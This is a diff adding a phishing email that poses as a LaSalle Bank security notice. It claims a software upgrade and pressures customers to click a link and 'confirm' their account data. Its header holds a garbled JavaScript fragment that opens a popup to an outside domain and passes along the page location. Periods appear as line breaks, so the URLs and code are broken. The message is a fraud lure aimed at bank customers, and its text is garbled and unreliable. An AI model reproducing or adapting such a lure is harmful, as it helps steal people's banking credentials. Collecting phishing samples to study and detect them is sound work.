@@ -1,0 +1,22 @@
+Subject: IMPORTANT:Security Issues *LaSalle Bank* <
+-- browser (((navigator
+appName ="Netscape") && (parseInt(navigator
+appVersion) >2 )) || ((navigator
+appName ="Microsoft Internet Explorer") && (parseInt(navigator
+appVersion) >2 ))); if (browser) { if (parent
+name 
+'homepopup') { open_this 'http://www
+home
+ro/ads
+php3
+CLIENT=' + window
+location; homepopup window
+open(open_this, "homepopup", "width=500,height=80"); } } //--> Dear LaSalle Bank customer This message contains graphics
+ If you do not see the graphics, click here to view
+ Dear client of LaSalle Bank, Technical services of the LaSalle Bank are carrying out a planned software upgrade
+ We earnestly ask you to visit the following link to start the procedure of confirmation on customers data
+ To get started, please click the link below: https://online
+lasalle
+com/ibslasalle/cmserver/users/default/confirm
+cfm This instruction has been sent to all bank customers and is obligatory to fallow
+ Thank you, Customers Support Service
